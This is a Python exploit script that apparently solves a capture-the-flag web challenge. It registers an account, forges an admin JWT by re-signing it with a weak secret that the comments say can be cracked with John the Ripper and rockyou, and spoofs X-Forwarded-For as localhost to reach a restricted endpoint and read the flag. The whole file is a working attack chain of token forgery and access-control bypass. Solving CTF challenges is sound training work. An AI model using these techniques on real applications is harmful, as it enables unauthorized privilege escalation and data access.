import requests
import hashlib
import jwt
from datetime import datetime, timedelta

# The base URL of the target application
BASE_URL = "http://codecon.cyberhacktivators.club:32868/"

# JWT Secret (you know from the challenge source)
JWT_SECRET = "password123"


# Register a new user
def register(username, password):
    url = f"{BASE_URL}/register"
    # Default role is 'user' but we can set it to admin and 
    # then no need to modify the JWT token
    data = {
        'username': username,
        'password': password,
        'role': 'user'
    }
    
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("[+] Registration successful.")
    else:
        print("[-] Registration failed.")
        exit()

# Login and fetch the JWT token
def login(username, password):
    session = requests.Session()
    url = f"{BASE_URL}/login"
    data = {
        'username': username,
        'password': password
    }
    response = session.post(url, data=data)
    print(response.headers)
    if response.status_code == 200:
        cookies = session.cookies.get_dict()
        set_cookie_header = session.headers.get('Set-Cookie')
        print("[+] Set-Cookie header: ", set_cookie_header)
        print("[+] Cookies: ", cookies)
        token = session.cookies.get('token')
        print("[+] Login successful. JWT Token fetched.")
        return token
    else:
        print("[-] Login failed.")
        exit()

# Decode the JWT token and modify it to become admin (JWT Secret is Bruteforceable as it is a weak secret)
# echo "TOKEN HERE" > jwt.txt
# john jwt.txt — wordlist=wordlist.txt(rockyou.txt) — format=HMAC-SHA256
def modify_jwt_token(token):
    try:
        decoded_token = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
        decoded_token['role'] = 'admin'  # Change role to admin
        # Regenerate the JWT with the modified payload
        new_token = jwt.encode({
            'username': decoded_token['username'],
            'role': 'admin',
            'exp': datetime.utcnow() + timedelta(hours=1)
        }, JWT_SECRET, algorithm='HS256')
        print("[+] JWT Token modified to admin role.")
        return new_token
    except Exception as e:
        print(f"[-] Failed to modify JWT token: {e}")
        exit()

# Fetch and print the profile URL after modifying the JWT token
def fetch_profile(new_token):
    url = f"{BASE_URL}/profile"
    headers = {'Cookie': f'token={new_token}'}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print("[+] Profile URL fetched successfully.")
        print(f"Profile URL: {response.text}")
    else:
        print(f"[-] Failed to fetch profile: {response.status_code}")
        exit()

# Perform SSRF to retrieve the flag from the restricted endpoint
def exploit_ssrf(new_token):
    url = f"{BASE_URL}/whtelseyouknow"
    headers = {
        'Cookie': f'token={new_token}',
        'X-Forwarded-For': '127.0.0.1'  # Spoof X-Forwarded-For to localhost
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f"[+] SSRF successful. Flag: {response.text}")
    else:
        print(f"[-] SSRF failed. Status code: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    # Set your username and password
    username = "hello123"
    password = "hello123"

    #Step 1: Register a new user
    register(username, password)

    # Step 2: Log in and get the original JWT token
    token = login(username, password)
    print(f"Original JWT Token: {token}")

    # Step 3: Modify the JWT token to have admin privileges
    new_token = modify_jwt_token(token)
    print(f"Modified JWT Token: {new_token}")

    # Step 4: Fetch the profile URL using the modified token
    fetch_profile(new_token)

    # Step 5: Exploit SSRF with X-Forwarded-For to retrieve the flag
    exploit_ssrf(new_token)
